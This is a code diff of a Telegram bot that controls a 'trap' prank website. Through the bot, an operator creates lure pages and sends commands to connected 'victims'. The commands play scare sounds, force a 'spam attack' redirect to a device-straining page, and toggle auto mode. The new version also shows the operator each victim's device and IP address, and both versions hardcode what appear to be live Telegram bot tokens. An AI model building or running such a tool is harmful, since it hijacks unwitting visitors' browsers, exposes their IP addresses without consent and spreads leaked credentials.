@@ -1,5 +1,5 @@
 /**
- * 🛡️ NFC CONTROL SYSTEM v3.0 [INLINE BUTTONS + EXPLOSIONS]
+ * 🛡️ NFC CONTROL SYSTEM v2.2 [VIDEO SOUND + STICKER SUPPORT]
  * Модуль управления сервером через Telegram
  * Язык интерфейса: Русский (Стандартный)
  */
@@ -10,16 +10,15 @@ const fs = require('fs');
 const path = require('path');
 const { v4: uuidv4 } = require('uuid');
 
-// --- ПОДКЛЮЧЕНИЕ FFMPEG для обработки видео ---
+// --- ПІДКЛЮЧЕННЯ FFMPEG для обробки відео ---
 const ffmpeg = require('fluent-ffmpeg');
 const ffmpegPath = require('@ffmpeg-installer/ffmpeg').path;
 ffmpeg.setFfmpegPath(ffmpegPath);
 
 // --- НАСТРОЙКИ ---
-const token = '8274521903:AAE0mD8-iM-I5sO8EZzh6UCXuTatyz5N-sQ'; // Твой токен NFC бота
-const ADMIN_ID = 8290877754; // ⚠️ ЗАМЕНИ НА СВОЙ TELEGRAM ID!
+const token = '8249796254:AAGV3kYCPf-siSmvl4SOXU4_44HS0y5RUPM'; // Твой токен NFC бота
 
-// Проверка наявності глобальних змінних
+// Перевірка наявності глобальних змінних
 if (!global.sessions || !global.activeVictims || !global.shortLinks) {
     console.error('❌ ERROR: Global variables not initialized! Make sure server.js initializes them first.');
     process.exit(1);
@@ -37,9 +36,8 @@ const bot = new TelegramBot(token, {
 
 const UPLOAD_DIR = path.join(__dirname, 'public', 'uploads');
 const wizardState = {}; // Состояние создания ловушки
-const editState = {}; // Состояние редактирования сессии
 
-console.log('🤖 NFC Control Bot v3.0 starting...');
+console.log('🤖 NFC Control Bot starting with VIDEO & STICKER support...');
 
 // --- ГЕНЕРАТОР КОДА ---
 function generateShortCode() {
@@ -120,56 +118,22 @@ async function convertStickerToImage(stickerPath) {
     });
 }
 
-// --- ГЛАВНОЕ МЕНЮ /START ---
+// --- ГЛАВНОЕ МЕНЮ ---
 bot.onText(/\/start/, (msg) => {
     const chatId = msg.chat.id;
-    
-    // Inline кнопка "Создать ловушку"
-    bot.sendMessage(chatId, 
-        "🤖 **NFC CONTROL v3.0**\n\n" +
-        "✨ **Новые возможности:**\n" +
-        "• 💥 Эффект взрывов на сайте\n" +
-        "• 🎨 Редактирование картинок и звуков\n" +
-        "• 🎯 Детонатор для мгновенного запуска\n" +
-        "• 🔧 Полное управление сессиями\n\n" +
-        "Выберите действие ниже:", 
-        {
-            parse_mode: 'Markdown',
-            reply_markup: {
-                inline_keyboard: [
-                    [{ text: "➕ Создать ловушку", callback_data: "create_new" }],
-                    [{ text: "📂 Активные сессии", callback_data: "show_sessions" }]
-                ]
-            }
+    bot.sendMessage(chatId, "🤖 **PANEL CONTROL V2.2**\n\n✨ **Новое:**\n• 🎬 Звук автоматически берется из видео\n• 🎭 Стикеры можно использовать как фон\n\nСистема готова к работе. Выберите действие:", {
+        parse_mode: 'Markdown',
+        reply_markup: {
+            keyboard: [
+                ['➕ Создать новую ловушку'], 
+                ['ℹ️ Статус сервера']
+            ],
+            resize_keyboard: true
         }
-    );
+    });
 });
 
-// --- АДМИН ПАНЕЛЬ /ADMIN ---
-bot.onText(/\/admin/, (msg) => {
-    const chatId = msg.chat.id;
-    
-    // Проверка прав
-    if (chatId !== ADMIN_ID) {
-        return bot.sendMessage(chatId, "⛔️ У вас нет доступа к админ-панели.");
-    }
-    
-    bot.sendMessage(chatId, 
-        "🔐 **АДМИН-ПАНЕЛЬ**\n\n" +
-        "Управление сервером и пользователями:", 
-        {
-            parse_mode: 'Markdown',
-            reply_markup: {
-                inline_keyboard: [
-                    [{ text: "📊 Статус сервера", callback_data: "admin_status" }],
-                    [{ text: "👥 Все пользователи", callback_data: "admin_users" }]
-                ]
-            }
-        }
-    );
-});
-
-// --- ОБРАБОТКА СООБЩЕНИЙ (WIZARD) ---
+// --- ОБРАБОТКА СООБЩЕНИЙ ---
 bot.on('message', async (msg) => {
     const chatId = msg.chat.id;
     const text = msg.text;
@@ -177,11 +141,44 @@ bot.on('message', async (msg) => {
     // Пропускаем команды
     if (text && text.startsWith('/')) return;
 
-    // --- СОЗДАНИЕ ЛОВУШКИ (WIZARD) ---
+    // 1. Создание
+    if (text === '➕ Создать новую ловушку') {
+        wizardState[chatId] = { step: 1, data: {} };
+        return bot.sendMessage(chatId, "📝 **ШАГ 1/2**\n\nОтправьте:\n• 🖼 **Изображение** (фон)\n• 🎭 **Стикер** (будет конвертирован в фон)\n• 🎬 **Видео** (звук будет извлечен автоматически)\n\n_Напишите 'skip' для стандартного фона._", { parse_mode: 'Markdown' });
+    }
+
+    // 2. Список сессий
+    if (text === '📂 Активные сессии') {
+        if (!global.sessions) {
+            return bot.sendMessage(chatId, "⚠️ Сервер не инициализирован.");
+        }
+        
+        const sessions = Object.values(global.sessions);
+        if (sessions.length === 0) {
+            return bot.sendMessage(chatId, "📂 Активных сессий не найдено.");
+        }
+
+        const recentSessions = sessions.slice(-5);
+        for (const s of recentSessions) {
+            sendControlPanel(chatId, s.id);
+        }
+        return;
+    }
+
+    // 3. Статус
+    if (text === 'ℹ️ Статус сервера') {
+        const vCount = Object.keys(global.activeVictims || {}).length;
+        const sCount = Object.keys(global.sessions || {}).length;
+        return bot.sendMessage(chatId, `📊 **SERVER STATUS**\n\n🟢 Онлайн жертв: ${vCount}\n📁 Всего сессий: ${sCount}\n⚡ Статус: Active`, { parse_mode: 'Markdown' });
+    }
+
+    // --- WIZARD (ПОШАГОВОЕ СОЗДАНИЕ) ---
     if (wizardState[chatId]) {
         const st = wizardState[chatId];
 
-        // ШАГ 1: ИЗОБРАЖЕНИЕ
+        // ====================================
+        // ШАГ 1: ИЗОБРАЖЕНИЕ / СТИКЕР / ВИДЕО
+        // ====================================
         if (st.step === 1) {
             let processMsg = null;
             
@@ -190,62 +187,87 @@ bot.on('message', async (msg) => {
                 processMsg = await bot.sendMessage(chatId, "⏳ Загрузка изображения...");
                 const f = await downloadFile(msg.photo[msg.photo.length - 1].file_id, 'img');
                 st.data.image = f.url || '';
+                st.data.sound = ''; // Нет звука из фото
                 await bot.deleteMessage(chatId, processMsg.message_id).catch(() => {});
             } 
             // СТИКЕР → КОНВЕРТИРУЕМ В JPG
             else if (msg.sticker) {
-                processMsg = await bot.sendMessage(chatId, "⏳ Конвертация стикера...");
+                processMsg = await bot.sendMessage(chatId, "⏳ Конвертация стикера в фон...");
                 const f = await downloadFile(msg.sticker.file_id, 'sticker');
                 
                 if (f.path) {
                     try {
                         const converted = await convertStickerToImage(f.path);
                         st.data.image = converted.url || '';
-                        await bot.deleteMessage(chatId, processMsg.message_id).catch(() => {});
+                        await bot.editMessageText("✅ Стикер конвертирован в фон!", {
+                            chat_id: chatId,
+                            message_id: processMsg.message_id
+                        });
                     } catch (e) {
+                        await bot.editMessageText("❌ Ошибка конвертации стикера", {
+                            chat_id: chatId,
+                            message_id: processMsg.message_id
+                        });
                         st.data.image = '';
                     }
+                } else {
+                    st.data.image = '';
                 }
+                st.data.sound = ''; // Нет звука из стикера
             }
-            // ВИДЕО → СОХРАНЯЕМ ДЛЯ ШАГА 2
+            // ВИДЕО → ИЗВЛЕКАЕМ ЗВУК
             else if (msg.video || msg.video_note) {
-                processMsg = await bot.sendMessage(chatId, "⏳ Обработка видео...");
+                processMsg = await bot.sendMessage(chatId, "⏳ Загрузка видео и извлечение звука...");
                 const fileId = msg.video ? msg.video.file_id : msg.video_note.file_id;
                 const f = await downloadFile(fileId, 'video');
                 
                 if (f.path) {
                     try {
+                        // Извлекаем звук
                         const audioData = await extractAudioFromVideo(f.path);
                         st.data.sound = audioData.url || '';
-                        await bot.deleteMessage(chatId, processMsg.message_id).catch(() => {});
+                        
+                        await bot.editMessageText("✅ Видео загружено, звук извлечен!\n\n_Переходим к шагу 2..._", {
+                            chat_id: chatId,
+                            message_id: processMsg.message_id,
+                            parse_mode: 'Markdown'
+                        });
                     } catch (e) {
+                        await bot.editMessageText("⚠️ Видео загружено, но не удалось извлечь звук", {
+                            chat_id: chatId,
+                            message_id: processMsg.message_id
+                        });
                         st.data.sound = '';
                     }
+                } else {
+                    st.data.sound = '';
                 }
-                st.data.image = ''; // Из видео картинку не берём
+                st.data.image = ''; // Нет изображения из видео
             }
             // SKIP
             else if (text && text.toLowerCase() === 'skip') {
                 st.data.image = '';
+                st.data.sound = '';
             }
+            // НЕВЕРНЫЙ ТИП
             else {
-                return bot.sendMessage(chatId, "⚠️ Отправьте фото, стикер, видео или напишите 'skip'");
+                return bot.sendMessage(chatId, "⚠️ Пожалуйста, отправьте изображение, стикер или видео (или напишите 'skip')");
             }
-
-            // Переход к шагу 2
+            
             st.step = 2;
-            return bot.sendMessage(chatId, 
-                "📝 **ШАГ 2/2**\n\n" +
-                "Отправьте:\n" +
-                "• 🔊 **Аудио**\n" +
-                "• 🎤 **Голосовое сообщение**\n" +
-                "• 🎬 **Видео** (звук будет извлечён)\n\n" +
-                "_Напишите 'skip' если звук уже загружен._", 
-                { parse_mode: 'Markdown' }
-            );
+            
+            // Если из видео уже есть звук, сразу создаем ловушку
+            if (st.data.sound) {
+                bot.sendMessage(chatId, "📝 **Звук уже получен из видео!**\n\n_Хотите добавить дополнительный аудиофайл? Отправьте его сейчас или напишите 'skip' для завершения._", { parse_mode: 'Markdown' });
+            } else {
+                bot.sendMessage(chatId, "📝 **ШАГ 2/2**\n\nОтправьте:\n• 🎵 **Аудиофайл** (скример/звук)\n• 🎤 **Голосовое сообщение**\n• 🎬 **Видео** (звук будет извлечен)\n\n_Напишите 'skip' для создания без звука._", { parse_mode: 'Markdown' });
+            }
+            return;
         }
 
-        // ШАГ 2: ЗВУК
+        // ====================================
+        // ШАГ 2: ЗВУК / ВИДЕО
+        // ====================================
         if (st.step === 2) {
             let processMsg = null;
             
@@ -265,7 +287,7 @@ bot.on('message', async (msg) => {
             }
             // ВИДЕО → ИЗВЛЕКАЕМ ЗВУК
             else if (msg.video || msg.video_note) {
-                processMsg = await bot.sendMessage(chatId, "⏳ Извлечение звука...");
+                processMsg = await bot.sendMessage(chatId, "⏳ Извлечение звука из видео...");
                 const fileId = msg.video ? msg.video.file_id : msg.video_note.file_id;
                 const f = await downloadFile(fileId, 'video');
                 
@@ -273,18 +295,27 @@ bot.on('message', async (msg) => {
                     try {
                         const audioData = await extractAudioFromVideo(f.path);
                         st.data.sound = audioData.url || '';
-                        await bot.deleteMessage(chatId, processMsg.message_id).catch(() => {});
+                        await bot.editMessageText("✅ Звук извлечен из видео!", {
+                            chat_id: chatId,
+                            message_id: processMsg.message_id
+                        });
                     } catch (e) {
-                        st.data.sound = st.data.sound || '';
+                        await bot.editMessageText("❌ Не удалось извлечь звук", {
+                            chat_id: chatId,
+                            message_id: processMsg.message_id
+                        });
+                        st.data.sound = st.data.sound || ''; // Оставляем старый звук если был
                     }
                 }
             }
             // SKIP
             else if (text && text.toLowerCase() === 'skip') {
+                // Звук уже может быть из видео с шага 1
                 st.data.sound = st.data.sound || '';
             }
+            // НЕВЕРНЫЙ ТИП
             else {
-                return bot.sendMessage(chatId, "⚠️ Отправьте аудио, голосовое, видео или 'skip'");
+                return bot.sendMessage(chatId, "⚠️ Пожалуйста, отправьте аудиофайл, голосовое сообщение или видео (или напишите 'skip')");
             }
 
             // Финиш
@@ -292,99 +323,9 @@ bot.on('message', async (msg) => {
             delete wizardState[chatId];
         }
     }
-
-    // --- РЕДАКТИРОВАНИЕ СЕССИИ ---
-    if (editState[chatId]) {
-        const st = editState[chatId];
-        const sessionId = st.sessionId;
-        const s = global.sessions[sessionId];
-        
-        if (!s) {
-            delete editState[chatId];
-            return bot.sendMessage(chatId, "⚠️ Сессия не найдена.");
-        }
-
-        // ИЗМЕНИТЬ КАРТИНКУ
-        if (st.mode === 'image') {
-            let processMsg = null;
-            
-            if (msg.photo) {
-                processMsg = await bot.sendMessage(chatId, "⏳ Загрузка...");
-                const f = await downloadFile(msg.photo[msg.photo.length - 1].file_id, 'img');
-                s.image = f.url || s.image;
-                await bot.deleteMessage(chatId, processMsg.message_id).catch(() => {});
-            } else if (msg.sticker) {
-                processMsg = await bot.sendMessage(chatId, "⏳ Конвертация...");
-                const f = await downloadFile(msg.sticker.file_id, 'sticker');
-                if (f.path) {
-                    try {
-                        const converted = await convertStickerToImage(f.path);
-                        s.image = converted.url || s.image;
-                    } catch (e) {}
-                }
-                await bot.deleteMessage(chatId, processMsg.message_id).catch(() => {});
-            } else {
-                return bot.sendMessage(chatId, "⚠️ Отправьте фото или стикер.");
-            }
-            
-            // Отправляем обновление на клиент
-            global.io.to(sessionId).emit('update-media', { 
-                image: s.image, 
-                sound: s.sound, 
-                auto: s.autoMode,
-                explosions: s.explosionsEnabled || false
-            });
-            
-            delete editState[chatId];
-            bot.sendMessage(chatId, "✅ Картинка обновлена!");
-            sendSessionControlPanel(chatId, sessionId);
-        }
-
-        // ИЗМЕНИТЬ ЗВУК
-        if (st.mode === 'sound') {
-            let processMsg = null;
-            
-            if (msg.audio) {
-                processMsg = await bot.sendMessage(chatId, "⏳ Загрузка...");
-                const f = await downloadFile(msg.audio.file_id, 'snd');
-                s.sound = f.url || s.sound;
-                await bot.deleteMessage(chatId, processMsg.message_id).catch(() => {});
-            } else if (msg.voice) {
-                processMsg = await bot.sendMessage(chatId, "⏳ Загрузка...");
-                const f = await downloadFile(msg.voice.file_id, 'voice');
-                s.sound = f.url || s.sound;
-                await bot.deleteMessage(chatId, processMsg.message_id).catch(() => {});
-            } else if (msg.video || msg.video_note) {
-                processMsg = await bot.sendMessage(chatId, "⏳ Извлечение звука...");
-                const fileId = msg.video ? msg.video.file_id : msg.video_note.file_id;
-                const f = await downloadFile(fileId, 'video');
-                if (f.path) {
-                    try {
-                        const audioData = await extractAudioFromVideo(f.path);
-                        s.sound = audioData.url || s.sound;
-                    } catch (e) {}
-                }
-                await bot.deleteMessage(chatId, processMsg.message_id).catch(() => {});
-            } else {
-                return bot.sendMessage(chatId, "⚠️ Отправьте аудио, голосовое или видео.");
-            }
-            
-            // Отправляем обновление
-            global.io.to(sessionId).emit('update-media', { 
-                image: s.image, 
-                sound: s.sound, 
-                auto: s.autoMode,
-                explosions: s.explosionsEnabled || false
-            });
-            
-            delete editState[chatId];
-            bot.sendMessage(chatId, "✅ Звук обновлён!");
-            sendSessionControlPanel(chatId, sessionId);
-        }
-    }
 });
 
-// --- ФУНКЦИЯ СОЗДАНИЯ СЕССИИ ---
+// --- ФУНКЦИЯ СОЗДАНИЯ ---
 function finishSessionCreation(chatId, data) {
     const id = uuidv4();
     const code = generateShortCode();
@@ -394,44 +335,48 @@ function finishSessionCreation(chatId, data) {
         shortCode: code,
         image: data.image || '',
         sound: data.sound || '',
-        autoMode: false, // По умолчанию выключен
-        explosionsEnabled: false, // Взрывы выключены
+        autoMode: true, // Автоматически включено
         totalVictims: 0,
         createdAt: new Date(),
         lastActiveAt: Date.now(),
         creator: {
             ip: 'Telegram Bot',
-            device: '🤖 Bot',
-            userId: chatId
-        }
+            device: '🤖 Bot'
+        },
+        imagesFiles: [],
+        soundsFiles: []
     };
 
-    // Запись в глобальную память
+    // Запись в глобальную память сервера
     global.sessions[id] = session;
     global.shortLinks[code] = id;
 
-    bot.sendMessage(chatId, "✅ **Ловушка создана!**", { parse_mode: 'Markdown' });
-    sendSessionControlPanel(chatId, id);
+    bot.sendMessage(chatId, "✅ **Ловушка успешно создана!**", { parse_mode: 'Markdown' });
+    sendControlPanel(chatId, id);
 }
 
-// --- ПАНЕЛЬ УПРАВЛЕНИЯ СЕССИЕЙ ---
-function sendSessionControlPanel(chatId, sessionId) {
+// --- ПАНЕЛЬ УПРАВЛЕНИЯ ---
+function sendControlPanel(chatId, sessionId) {
     const s = global.sessions[sessionId];
     if (!s) {
-        bot.sendMessage(chatId, "⚠️ Сессия не найдена.");
+        bot.sendMessage(chatId, "⚠️ Ошибка: сессия не найдена.");
         return;
     }
 
+    // Считаем жертв
     const victims = Object.values(global.activeVictims || {}).filter(v => v.roomId === sessionId);
+    
+    // Ссылка (замени на свой домен)
     const link = `https://prank-nfc.onrender.com/${s.shortCode}`; 
 
-    let msg = `🆔 **ID:** \`${s.shortCode}\`\n🔗 **Ссылка:** \`${link}\`\n👥 **Онлайн:** ${victims.length}`;
+    let msg = `🆔 **ID Сессии:** \`${s.shortCode}\`\n🔗 **Ссылка:** \`${link}\`\n👥 **Онлайн:** ${victims.length}`;
     
+    // Показываем что загружено
     if (s.image) msg += "\n🖼 Фон: ✅";
     if (s.sound) msg += "\n🔊 Звук: ✅";
 
     if (victims.length > 0) {
-        msg += "\n\n📱 **Устройства:**\n" + victims.map(v => `• ${v.device || 'Unknown'}`).join('\n');
+        msg += "\n\n📱 **Устройства:**\n" + victims.map(v => `• ${v.device} [${v.ip}]`).join('\n');
     }
 
     bot.sendMessage(chatId, msg, {
@@ -439,297 +384,108 @@ function sendSessionControlPanel(chatId, sessionId) {
         reply_markup: {
             inline_keyboard: [
                 [
-                    { text: "🎨 Изменить картинку", callback_data: `edit_image_${sessionId}` },
-                    { text: "🔊 Изменить звук", callback_data: `edit_sound_${sessionId}` }
+                    { text: "🔊 Скример", callback_data: `scare_${sessionId}` }, 
+                    { text: "☢️ Спам-атака", callback_data: `bomb_${sessionId}` }
                 ],
                 [
-                    { text: s.explosionsEnabled ? "💥 Выключить взрывы" : "💥 Включить взрывы", callback_data: `toggle_explosions_${sessionId}` }
+                    { text: `🤖 Авто-режим: ${s.autoMode ? 'ВКЛ' : 'ВЫКЛ'}`, callback_data: `auto_${sessionId}` }
                 ],
                 [
-                    { text: "💣 Детонатор", callback_data: `detonate_${sessionId}` }
-                ],
-                [
-                    { text: "🔄 Обновить", callback_data: `refresh_${sessionId}` },
-                    { text: "❌ Удалить", callback_data: `delete_${sessionId}` }
+                    { text: "🔄 Обновить", callback_data: `refresh_${sessionId}` }, 
+                    { text: "❌ Удалить", callback_data: `del_${sessionId}` }
                 ]
             ]
         }
+    }).catch(err => {
+        console.error('Error sending control panel:', err.message);
     });
 }
 
-// --- ПОКАЗАТЬ ВСЕ СЕССИИ ---
-function showAllSessions(chatId) {
-    const sessions = Object.values(global.sessions || {});
-    
-    if (sessions.length === 0) {
-        return bot.sendMessage(chatId, "📂 Нет активных сессий.");
-    }
-
-    const buttons = sessions.map(s => {
-        return [{ text: `${s.shortCode} (👥 ${Object.values(global.activeVictims || {}).filter(v => v.roomId === s.id).length})`, callback_data: `view_${s.id}` }];
-    });
-
-    bot.sendMessage(chatId, "📂 **Активные сессии:**\n\nВыберите сессию для управления:", {
-        parse_mode: 'Markdown',
-        reply_markup: {
-            inline_keyboard: buttons
-        }
-    });
-}
-
-// --- ОБРАБОТКА CALLBACK КНОПОК ---
-bot.on('callback_query', async (query) => {
+// --- ОБРАБОТКА КНОПОК ---
+bot.on('callback_query', (query) => {
     const chatId = query.message.chat.id;
     const data = query.data;
     
-    // СОЗДАТЬ НОВУЮ ЛОВУШКУ
-    if (data === 'create_new') {
-        wizardState[chatId] = { step: 1, data: {} };
-        bot.answerCallbackQuery(query.id);
-        return bot.sendMessage(chatId, 
-            "📝 **ШАГ 1/2**\n\n" +
-            "Отправьте:\n" +
-            "• 🖼 **Фото** (фон)\n" +
-            "• 🎭 **Стикер** (будет конвертирован)\n" +
-            "• 🎬 **Видео** (звук извлечён автоматически)\n\n" +
-            "_Напишите 'skip' для стандартного фона._", 
-            { parse_mode: 'Markdown' }
-        );
+    if (!data || !data.includes('_')) {
+        return bot.answerCallbackQuery(query.id, { text: "⚠️ Неверный формат данных." });
+    }
+    
+    const [action, sessionId] = data.split('_');
+    const s = global.sessions ? global.sessions[sessionId] : null;
+
+    if (!s && action !== 'del') {
+        return bot.answerCallbackQuery(query.id, { text: "⚠️ Ошибка: Сессия не найдена." });
     }
 
-    // ПОКАЗАТЬ СЕССИИ
-    if (data === 'show_sessions') {
-        bot.answerCallbackQuery(query.id);
-        return showAllSessions(chatId);
+    if (!global.io) {
+        return bot.answerCallbackQuery(query.id, { text: "❌ Ошибка сервера: Socket.IO недоступен." });
     }
 
-    // ПРОСМОТР СЕССИИ
-    if (data.startsWith('view_')) {
-        const sessionId = data.replace('view_', '');
-        bot.answerCallbackQuery(query.id);
-        bot.deleteMessage(chatId, query.message.message_id).catch(() => {});
-        return sendSessionControlPanel(chatId, sessionId);
-    }
+    switch (action) {
+        case 'scare':
+            global.io.to(sessionId).emit('play-sound');
+            bot.answerCallbackQuery(query.id, { text: "🔊 Звук отправлен!" });
+            break;
 
-    // ИЗМЕНИТЬ КАРТИНКУ
-    if (data.startsWith('edit_image_')) {
-        const sessionId = data.replace('edit_image_', '');
-        editState[chatId] = { sessionId, mode: 'image' };
-        bot.answerCallbackQuery(query.id, { text: "📤 Отправьте новое фото или стикер" });
-        return bot.sendMessage(chatId, "🎨 Отправьте новое изображение или стикер:");
-    }
+        case 'bomb':
+            global.io.to(sessionId).emit('force-redirect', { url: "https://prank-nfc.onrender.com/volumeshader_bm.html" }); 
+            bot.answerCallbackQuery(query.id, { text: "☢️ Команда атаки отправлена!" });
+            break;
 
-    // ИЗМЕНИТЬ ЗВУК
-    if (data.startsWith('edit_sound_')) {
-        const sessionId = data.replace('edit_sound_', '');
-        editState[chatId] = { sessionId, mode: 'sound' };
-        bot.answerCallbackQuery(query.id, { text: "📤 Отправьте новый звук" });
-        return bot.sendMessage(chatId, "🔊 Отправьте аудио, голосовое или видео:");
-    }
-
-    // ВКЛЮЧИТЬ/ВЫКЛЮЧИТЬ ВЗРЫВЫ
-    if (data.startsWith('toggle_explosions_')) {
-        const sessionId = data.replace('toggle_explosions_', '');
-        const s = global.sessions[sessionId];
-        
-        if (!s) {
-            return bot.answerCallbackQuery(query.id, { text: "⚠️ Сессия не найдена" });
-        }
-
-        s.explosionsEnabled = !s.explosionsEnabled;
-        
-        // Отправляем обновление клиенту
-        global.io.to(sessionId).emit('update-media', { 
-            image: s.image, 
-            sound: s.sound, 
-            auto: s.autoMode,
-            explosions: s.explosionsEnabled
-        });
-
-        bot.answerCallbackQuery(query.id, { text: s.explosionsEnabled ? "💥 Взрывы включены!" : "❌ Взрывы выключены" });
-        
-        // Обновляем панель
-        bot.deleteMessage(chatId, query.message.message_id).catch(() => {});
-        return sendSessionControlPanel(chatId, sessionId);
-    }
-
-    // ДЕТОНАТОР
-    if (data.startsWith('detonate_')) {
-        const sessionId = data.replace('detonate_', '');
-        global.io.to(sessionId).emit('play-sound');
-        return bot.answerCallbackQuery(query.id, { text: "💣 Звук запущен!" });
-    }
-
-    // ОБНОВИТЬ
-    if (data.startsWith('refresh_')) {
-        const sessionId = data.replace('refresh_', '');
-        bot.deleteMessage(chatId, query.message.message_id).catch(() => {});
-        bot.answerCallbackQuery(query.id, { text: "🔄 Обновлено" });
-        return sendSessionControlPanel(chatId, sessionId);
-    }
-
-    // УДАЛИТЬ
-    if (data.startsWith('delete_')) {
-        const sessionId = data.replace('delete_', '');
-        const s = global.sessions[sessionId];
-        
-        if (s && global.shortLinks[s.shortCode]) {
-            delete global.shortLinks[s.shortCode];
-        }
-        delete global.sessions[sessionId];
-        
-        bot.deleteMessage(chatId, query.message.message_id).catch(() => {});
-        return bot.answerCallbackQuery(query.id, { text: "🗑 Удалено" });
-    }
-
-    // === АДМИН ПАНЕЛЬ ===
-    if (data === 'admin_status') {
-        if (chatId !== ADMIN_ID) {
-            return bot.answerCallbackQuery(query.id, { text: "⛔️ Нет доступа" });
-        }
-
-        const vCount = Object.keys(global.activeVictims || {}).length;
-        const sCount = Object.keys(global.sessions || {}).length;
-        
-        bot.answerCallbackQuery(query.id);
-        return bot.sendMessage(chatId, 
-            `📊 **СТАТУС СЕРВЕРА**\n\n` +
-            `🟢 Онлайн жертв: ${vCount}\n` +
-            `📁 Всего сессий: ${sCount}\n` +
-            `⚡ Статус: Active`, 
-            { parse_mode: 'Markdown' }
-        );
-    }
-
-    if (data === 'admin_users') {
-        if (chatId !== ADMIN_ID) {
-            return bot.answerCallbackQuery(query.id, { text: "⛔️ Нет доступа" });
-        }
-
-        const userSessions = {};
-        
-        Object.values(global.sessions || {}).forEach(s => {
-            const userId = s.creator?.userId || 'unknown';
-            if (!userSessions[userId]) {
-                userSessions[userId] = [];
+        case 'auto':
+            s.autoMode = !s.autoMode;
+            global.io.to(sessionId).emit('update-media', { 
+                sound: s.sound, 
+                image: s.image, 
+                auto: s.autoMode 
+            });
+            
+            try {
+                const kb = query.message.reply_markup.inline_keyboard;
+                kb[1][0].text = `🤖 Авто-режим: ${s.autoMode ? 'ВКЛ' : 'ВЫКЛ'}`;
+                bot.editMessageReplyMarkup(
+                    { inline_keyboard: kb }, 
+                    { chat_id: chatId, message_id: query.message.message_id }
+                );
+            } catch (e) {
+                console.error('Error updating button:', e.message);
             }
-            userSessions[userId].push(s);
-        });
+            
+            bot.answerCallbackQuery(query.id, { text: `Авто-режим: ${s.autoMode ? 'Включен ✅' : 'Выключен ❌'}` });
+            break;
 
-        const buttons = Object.keys(userSessions).map(userId => {
-            const count = userSessions[userId].length;
-            return [{ text: `User ${userId} (📁 ${count})`, callback_data: `admin_user_${userId}` }];
-        });
+        case 'refresh':
+            bot.deleteMessage(chatId, query.message.message_id).catch(() => {});
+            sendControlPanel(chatId, sessionId);
+            bot.answerCallbackQuery(query.id, { text: "🔄 Обновлено" });
+            break;
 
-        if (buttons.length === 0) {
-            bot.answerCallbackQuery(query.id);
-            return bot.sendMessage(chatId, "👥 Нет пользователей с сессиями.");
-        }
-
-        bot.answerCallbackQuery(query.id);
-        return bot.sendMessage(chatId, "👥 **Пользователи:**", {
-            parse_mode: 'Markdown',
-            reply_markup: {
-                inline_keyboard: buttons
+        case 'del':
+            if (global.sessions[sessionId]) {
+                delete global.sessions[sessionId];
             }
-        });
-    }
-
-    if (data.startsWith('admin_user_')) {
-        if (chatId !== ADMIN_ID) {
-            return bot.answerCallbackQuery(query.id, { text: "⛔️ Нет доступа" });
-        }
-
-        const userId = data.replace('admin_user_', '');
-        const userSessions = Object.values(global.sessions || {}).filter(s => 
-            String(s.creator?.userId) === userId
-        );
-
-        if (userSessions.length === 0) {
-            bot.answerCallbackQuery(query.id);
-            return bot.sendMessage(chatId, "⚠️ У этого пользователя нет сессий.");
-        }
-
-        const buttons = userSessions.map(s => {
-            const victims = Object.values(global.activeVictims || {}).filter(v => v.roomId === s.id).length;
-            return [{ text: `${s.shortCode} (👥 ${victims})`, callback_data: `admin_session_${s.id}` }];
-        });
-
-        bot.answerCallbackQuery(query.id);
-        return bot.sendMessage(chatId, `📁 **Сессии пользователя ${userId}:**`, {
-            parse_mode: 'Markdown',
-            reply_markup: {
-                inline_keyboard: buttons
+            if (s && global.shortLinks[s.shortCode]) {
+                delete global.shortLinks[s.shortCode];
             }
-        });
+            bot.deleteMessage(chatId, query.message.message_id).catch(() => {});
+            bot.answerCallbackQuery(query.id, { text: "🗑 Сессия удалена." });
+            break;
+
+        default:
+            bot.answerCallbackQuery(query.id, { text: "⚠️ Неизвестное действие" });
     }
-
-    if (data.startsWith('admin_session_')) {
-        if (chatId !== ADMIN_ID) {
-            return bot.answerCallbackQuery(query.id, { text: "⛔️ Нет доступа" });
-        }
-
-        const sessionId = data.replace('admin_session_', '');
-        const s = global.sessions[sessionId];
-
-        if (!s) {
-            bot.answerCallbackQuery(query.id);
-            return bot.sendMessage(chatId, "⚠️ Сессия не найдена.");
-        }
-
-        const victims = Object.values(global.activeVictims || {}).filter(v => v.roomId === sessionId);
-        const link = `https://prank-nfc.onrender.com/${s.shortCode}`;
-
-        let msg = `🔐 **АДМИН ПРОСМОТР**\n\n`;
-        msg += `🆔 ID: \`${s.shortCode}\`\n`;
-        msg += `🔗 Ссылка: \`${link}\`\n`;
-        msg += `👤 Создатель: ${s.creator?.userId || 'Unknown'}\n`;
-        msg += `👥 Онлайн: ${victims.length}\n`;
-        msg += `📅 Создана: ${new Date(s.createdAt).toLocaleString('ru-RU')}`;
-
-        bot.answerCallbackQuery(query.id);
-        return bot.sendMessage(chatId, msg, {
-            parse_mode: 'Markdown',
-            reply_markup: {
-                inline_keyboard: [
-                    [
-                        { text: "🔄 Обновить", callback_data: `admin_session_${sessionId}` },
-                        { text: "🗑 Удалить", callback_data: `admin_delete_${sessionId}` }
-                    ]
-                ]
-            }
-        });
-    }
-
-    if (data.startsWith('admin_delete_')) {
-        if (chatId !== ADMIN_ID) {
-            return bot.answerCallbackQuery(query.id, { text: "⛔️ Нет доступа" });
-        }
-
-        const sessionId = data.replace('admin_delete_', '');
-        const s = global.sessions[sessionId];
-        
-        if (s && global.shortLinks[s.shortCode]) {
-            delete global.shortLinks[s.shortCode];
-        }
-        delete global.sessions[sessionId];
-        
-        bot.deleteMessage(chatId, query.message.message_id).catch(() => {});
-        return bot.answerCallbackQuery(query.id, { text: "🗑 Сессия удалена" });
-    }
-
-    bot.answerCallbackQuery(query.id, { text: "⚠️ Неизвестная команда" });
 });
 
-// Обработка ошибок
+// Обработка ошибок polling
 bot.on('polling_error', (error) => {
     console.error('❌ Polling error:', error.code, error.message);
 });
 
+// Обработка общих ошибок
 bot.on('error', (error) => {
     console.error('❌ Bot error:', error.message);
 });
 
-console.log('✅ NFC Control Bot v3.0 loaded successfully');
+console.log('✅ NFC Control Bot loaded: VIDEO SOUND + STICKER support enabled');
 
 module.exports = bot;
